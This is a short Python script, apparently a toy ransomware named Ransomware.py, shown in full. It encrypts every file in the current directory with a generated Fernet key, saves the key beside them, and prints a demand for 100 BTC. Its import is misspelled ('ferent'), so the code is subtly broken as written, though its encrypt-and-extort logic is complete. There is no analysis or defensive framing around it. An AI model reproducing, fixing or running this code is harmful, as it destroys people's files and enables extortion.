#!/usr/bin/env python3

import os
from cryptography.fernet import ferent

files = []


for file in os.listdir():
    if file == "Ransomware.py" or file == "thekey.key":
        continue
    if os.path.isfile(file):
        files.append(file)

print(files)
    
key =  ferent.generate_key()

with open("thekey.key", "wb") as thekey:
    thekey.write(key)

for file in files:
    with open(file, "rb") as thefile:
        contents = thefile.read()
    contents_encrypted = ferent (key).encrypt(contents)
    with open(file, "wb") as thefile:
        thefile.write(contents_encrypted)

print("Hello Your All Files Are Encrypted Send Me 100 BTC To Decrpty them")






